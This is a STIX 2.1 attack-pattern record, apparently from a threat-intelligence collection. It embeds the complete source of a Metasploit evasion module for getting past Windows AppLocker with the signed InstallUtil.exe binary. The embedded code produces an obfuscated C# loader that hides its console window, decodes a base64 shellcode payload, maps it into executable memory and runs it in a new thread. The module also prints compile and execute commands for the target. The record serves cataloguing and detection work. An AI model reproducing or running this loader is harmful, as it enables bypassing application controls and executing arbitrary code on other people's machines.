{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bde68930-04fc-4902-a87e-edfa41d5f2d5",
    "created": "2024-08-14T16:33:19.191919Z",
    "modified": "2024-08-14T16:33:19.191922Z",
    "name": "Applocker Evasion - .NET Framework Installation Utility",
    "description": "( This module will assist you in evading Microsoft Windows Applocker and Software Restriction Policies. This technique utilises the Microsoft signed binary InstallUtil.exe to execute user supplied code. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/evasion/windows/applocker_evasion_install_util.rb",
            "external_id": "applocker_evasion_install_util.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://attack.mitre.org/techniques/T1118/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Evasion\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'        => 'Applocker Evasion - .NET Framework Installation Utility',\n      'Description' => %q(\n         This module will assist you in evading Microsoft Windows\n         Applocker and Software Restriction Policies.\n         This technique utilises the Microsoft signed binary\n         InstallUtil.exe to execute user supplied code.\n      ),\n      'Author'      =>\n        [\n          'Nick Tyrer <@NickTyrer>', # module development\n          'Casey Smith' # install_util bypass research\n        ],\n      'License'     => 'MSF_LICENSE',\n      'Platform'    => 'win',\n      'Arch'        => [ARCH_X86, ARCH_X64],\n      'Targets'     => [['Microsoft Windows', {}]],\n      'References'  => [['URL', 'https://attack.mitre.org/techniques/T1118/']]\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('FILENAME', [true, 'Filename for the evasive file (default: install_util.txt)', 'install_util.txt'])\n      ]\n    )\n  end\n\n  def build_payload\n    Rex::Text.encode_base64(payload.encoded)\n  end\n\n  def obfu\n    Rex::Text.rand_text_alpha 8\n  end\n\n  def install_util\n    esc = build_payload\n    mod = [obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu]\n    <<~HEREDOC\n      using System;\n      namespace #{mod[12]}\n      {\n      public class #{mod[11]} { public static void Main() { } }\n      [System.ComponentModel.RunInstaller(true)]\n      public class #{mod[10]} : System.Configuration.Install.Installer\n      {\n      private static Int32 #{mod[0]}=0x1000;\n      private static IntPtr #{mod[1]}=(IntPtr)0x40;\n      private static UInt32 #{mod[2]} = 0xFFFFFFFF;\n      [System.Runtime.InteropServices.DllImport(\"kernel32\")]\n      private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);\n      [System.Runtime.InteropServices.DllImport(\"kernel32\")]\n      private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr id);\n      [System.Runtime.InteropServices.DllImport(\"kernel32\")]\n      private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);\n      [System.Runtime.InteropServices.DllImport(\"user32.dll\")]\n      static extern bool ShowWindow(IntPtr #{mod[3]}, int nCmdShow);\n      [System.Runtime.InteropServices.DllImport(\"Kernel32\")]\n      private static extern IntPtr GetConsoleWindow();\n      const int #{mod[4]} = 0;\n      public override void Uninstall(System.Collections.IDictionary s)\n      {\n      IntPtr #{mod[3]};\n      #{mod[3]} = GetConsoleWindow();\n      ShowWindow(#{mod[3]}, #{mod[4]});\n      string #{mod[5]} = \"#{esc}\";\n      byte[] #{mod[6]} = Convert.FromBase64String(#{mod[5]});\n      byte[] #{mod[7]} = #{mod[6]};\n      IntPtr #{mod[8]} = VirtualAlloc(IntPtr.Zero, (UIntPtr)#{mod[7]}.Length, #{mod[0]}, #{mod[1]});\n      System.Runtime.InteropServices.Marshal.Copy(#{mod[7]}, 0, #{mod[8]}, #{mod[7]}.Length);\n      IntPtr #{mod[9]} = IntPtr.Zero;\n      WaitForSingleObject(CreateThread(#{mod[9]}, UIntPtr.Zero, #{mod[8]}, #{mod[9]}, 0, ref #{mod[9]}), #{mod[2]});\n      }\n      }\n      }\n    HEREDOC\n  end\n\n  def file_format_filename(name = '')\n    name.empty? ? @fname : @fname = name\n  end\n\n  def create_files\n    f1 = datastore['FILENAME'].empty? ? 'install_util.txt' : datastore['FILENAME']\n    f1 << '.txt' unless f1.downcase.end_with?('.txt')\n    file1 = install_util\n    file_format_filename(f1)\n    file_create(file1)\n  end\n\n  def instructions\n    print_status \"Copy #{datastore['FILENAME']} to the target\"\n    if payload.arch.first == ARCH_X86\n      print_status \"Compile using: C:\\\\Windows\\\\Microsoft.Net\\\\Framework\\\\[.NET Version]\\\\csc.exe /out:#{datastore['FILENAME'].gsub('.txt', '.exe')} #{datastore['FILENAME']}\"\n      print_status \"Execute using: C:\\\\Windows\\\\Microsoft.Net\\\\Framework\\\\[.NET Version]\\\\InstallUtil.exe /logfile= /LogToConsole=false /U #{datastore['FILENAME'].gsub('.txt', '.exe')}\"\n    else\n      print_status \"Compile using: C:\\\\Windows\\\\Microsoft.Net\\\\Framework64\\\\[.NET Version]\\\\csc.exe /out:#{datastore['FILENAME'].gsub('.txt', '.exe')} #{datastore['FILENAME']}\"\n      print_status \"Execute using: C:\\\\Windows\\\\Microsoft.Net\\\\Framework64\\\\[.NET Version]\\\\InstallUtil.exe /logfile= /LogToConsole=false /U #{datastore['FILENAME'].gsub('.txt', '.exe')}\"\n    end\n  end\n\n  def run\n    create_files\n    instructions\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}